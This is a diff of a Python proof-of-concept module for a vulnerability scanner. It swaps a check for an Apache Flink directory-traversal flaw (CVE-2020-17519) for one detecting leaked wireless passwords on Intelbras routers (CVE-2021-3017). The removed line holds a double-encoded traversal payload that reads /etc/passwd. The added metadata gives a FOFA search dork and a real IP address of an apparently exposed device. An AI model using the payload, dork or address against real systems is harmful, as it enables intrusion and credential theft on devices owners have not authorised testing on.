@@ -2,7 +2,6 @@
 import requests
 from lib.core.common import url_handle,get_random_ua
 from lib.core.poc import POCBase
-
 # ...
 import urllib3
 urllib3.disable_warnings()
@@ -18,22 +17,23 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Apache Flink目录穿透(CVE-2020-17519)",                        # 漏洞名称
-        "VulnID" : "CVE-2020-17519",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Apache Flink",                     # 漏洞应用名称
-        "AppVersion" : "Apache Flink 1.11.0",                  # 漏洞应用版本
-        "VulnDate" : "2020-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
+        "name" : "Intelbras Wireless 未授权与密码泄露",                        # 漏洞名称
+        "VulnID" : "CVE-2021-3017",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "win_300_firmware 等",                     # 漏洞应用名称
+        "AppVersion" : "",                  # 漏洞应用版本
+        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-        
+            Intelbras IWR 3000N是波兰Intelbras公司的一款无线路由器。 
+            Intelbras WIN 300 and WRN 342 devices 2021-01-04版本及之前版本存在安全漏洞，
+            该漏洞允许远程攻击者通过读取HTML源代码中的def wireless spassword行来发现凭据。
         """,                                # 漏洞简要描述
 
-        "fofa-dork":"",                     # fofa搜索语句
-        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
+        "fofa-dork":"""
+            body="def_wirelesspassword"
+        """,                     # fofa搜索语句
+        "example" : "http://164.163.156.242:8091",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
-
     }
-
-    timeout = 10
 
     def _verify(self):
         """
@@ -44,7 +44,8 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd" # url自己按需调整
+        url = self.target + "" # url自己按需调整
+        
 
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
@@ -53,16 +54,17 @@ class POC(POCBase):
         
         try:
             """
-            检测逻辑，漏洞存在则修改vuln值，漏洞不存在则不动
+            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and "root:/root" in req.text:
+            if "def_wirelesspassword" in req.text and "def_SSID" in req.text and req.status_code == 200:
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
         except Exception as e:
             raise e
-
+        
+        # 以下逻辑酌情使用
         if self._honeypot_check(vuln[1]) == True:
             vuln[0] = False
         
